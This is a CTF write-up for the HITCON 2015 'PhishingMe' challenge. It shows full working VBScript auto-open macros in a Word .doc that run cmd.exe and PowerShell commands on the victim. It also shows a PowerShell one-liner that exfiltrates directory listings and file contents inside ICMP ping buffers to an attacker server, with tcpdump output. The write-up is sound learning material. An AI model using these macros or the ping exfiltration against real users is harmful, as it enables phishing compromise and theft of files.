---
layout: post
title:  "HITCON - PhishingMe"
date:   2015-10-19 18:03:59
categories: ctf phishing
---

```
Sent me a .doc, I will open it if your subject is "HITCON 2015"!
Find the flag under my file system. 
p.s. I've enabled Macro for you. ^_________________^
phishing.me.hitcon.2015@gmail.com.
```

PhishingMe was an introduction into the fun world of Phishing via VBScript macros in a `.doc`. Here we go!

## Prep Malicious File

First things first. We need a Microsoft Word `.doc` that will auto run a script on opening. The process used is described below.

Create a new `.doc` and open up the `Macros` window from the `Developer` tab.


![macro](/assets/images/macro1.png)

Create a new macro.

![macro2](/assets/images/macro2.png)

For our macro, we will attempt to run a simple command via `cmd.exe`.

```
Sub Auto_Open()
    Call Debugging
End Sub

Sub AutoOpen()
    Call Debugging
End Sub

Public Function Debugging() As Variant
    Set objShell = CreateObject("Wscript.Shell")
    strCmd = "cmd.exe /c ""ping SERVER_IP"""
    Set objExec = objShell.Exec(strCmd)
End Function
```

Drop this script into the macro window and save that bad boy.

![macro3](/assets/images/macro3.png)

To test that the command executed, let's watch for ping requests on our server.

```
tcpdump -nXX icmp
```

Save the `.doc`, reopen it, and see if we see our ICMP `echo request` on the server.

```
10:25:49.351725 IP MY-TEST-IP > MY-IP: ICMP echo request, id 1, seq 21, length 40
```

Shweet! The `.doc` is working on our end. Let's see if it works on the victim's end. We email the `.doc` to `phishing.me.hitcon.2015@gmail.com` and wait again to see if we see traffic on our server.

```
10:29:21.411226 IP VICTIM-IP > MY-IP: ICMP echo request, id 1, seq 21, length 40
```

Boom! Now we know that we have command execution! What can we do with this?

## Trial and Error

The first target was the common CTF strategy: get a shell and cat the flag. We can attempt to do this with a Powershell RAT from [PowershellEmpire](http://powershellempire.com). After about 30 - 45 minutes of testing, we realize the callbacks are not reaching our server from the victim, even though they work locally with a test environment. There must be a firewall or something blocking outbound traffic in the way. But we received traffic from the server already.. hmm..

## Padding FTW

We know that ICMP `echo requests` reach our server just fine. We also know that we can execute commands via our VBScript. Is there a way to send `ping`s via something like.. Powershell?! (I got really excited since this was my first time to use Powershell in a CTF). Let's see how we can send an ICMP `echo request`.

[Microsoft's](https://msdn.microsoft.com/en-us/library/ms144953.aspx) page on `System.Net.NetworkInformation.Ping` is shown below:

![Ping1](/assets/images/ping1.png)

![Ping2](/assets/images/ping2.png)

Looks like all we need is to pass an IP address, timeout, and.. what is that? a buffer? in an ICMP `echo request`? Let's take a look at the RFC for ICMP `echo request`.

![RFC](/assets/images/ping-rfc.png)

As it turns out, there is a data buffer in an ICMP `echo request` which we can set ourselves via the third parameter in the `Send` function.

Calling this function in Powershell looks something like this:

```
(New-Object System.Net.NetworkInformation.Ping).Send(server_ip, timeout, buffer)
```

In theory we should be able to pass the results of a command in the buffer field and see the results in our `tcpdump` output. Let's do a quick `dir` via ICMP.

```
powershell "$dir=dir;
(New-Object System.Net.NetworkInformation.Ping).Send('SERVER_IP', 1000, $dir)"
```

Ah, quick problem here. `Send` is expecting a `Byte[]` for the buffer parameter. Quick conversion will fix that.

```
powershell "$dir=dir;
(New-Object System.Net.NetworkInformation.Ping).Send('SERVER_IP', 1000, [system.Text.Encoding]::UTF8.GetBytes($dir)"
```

Replacing this command in our VBScript should yield success. (Note, `""` is the way to escape `"`)

```
Sub Auto_Open()
    Call Debugging
End Sub

Sub AutoOpen()
    Call Debugging
End Sub

Public Function Debugging() As Variant
    Set objShell = CreateObject("Wscript.Shell")
    strCmd = "powershell ""$dir=dir;(New-Object System.Net.NetworkInformation.Ping).Send('OUR_SERVER_IP', 1000, [system.Text.Encoding]::UTF8.GetBytes($dir)"""
    Set objExec = objShell.Exec(strCmd)
End Function
```

Throwing this at the victim shows very interesting results.

```
10:10:00.816080 IP VICTIM_IP > OUR_SERVER_IP: ICMP echo request, id 1, seq 19, length 75
0x0030:  6773 2050 726f 6772 616d 2046 696c 6573  gs.Program.Files
0x0040:  2050 726f 6772 616d 2046 696c 6573 2028  .Program.Files.(
0x0050:  7838 3629 2055 7365 7273 2057 696e 646f  x86).Users.Windo
0x0060:  7773 2073 6563 7265 742e 7478 74         ws.secret.txt
```

Well, well, well.. `secret.txt` looks interesting. Let's finanlly replace the `dir` with `type secret.txt` and see if we see good results.

```
Sub Auto_Open()
    Call Debugging
End Sub

Sub AutoOpen()
    Call Debugging
End Sub

Public Function Debugging() As Variant
    Set objShell = CreateObject("Wscript.Shell")
    strCmd = "powershell ""$dir=type secret.txt;(New-Object System.Net.NetworkInformation.Ping).Send('OUR_SERVER_IP', 1000, [system.Text.Encoding]::UTF8.GetBytes($dir)"""
    Set objExec = objShell.Exec(strCmd)
End Function
```

```
10:11:35.383781 IP VICTIM_IP > OUR_SERVER_IP: ICMP echo request, id 1, seq 20, length 52 
...
0x0020:  .... .... .... .... .... 6869 7463 6f6e  hitcon
0x0030:  7b6d 3463 7230 5f6d 6131 7761 7265 5f31  {m4cr0_ma1ware_1
0x0040:  735f 6d34 6b31 6e67 5f61 5f63 306d 6562  s_m4k1ng_a_c0meb
0x0050:  3463 6b21 217d                           4ck!!}
```

And look what we have here..

```
hitcon{m4cr0_ma1ware_1s_m4k1ng_a_c0meb4ck!!}
```

Super cool challenge and not a bad way to use Powershell.

More information on ping exfiltration: [here](http://blog.ring-zer0.com/2014/02/data-exfiltration-on-linux.html)
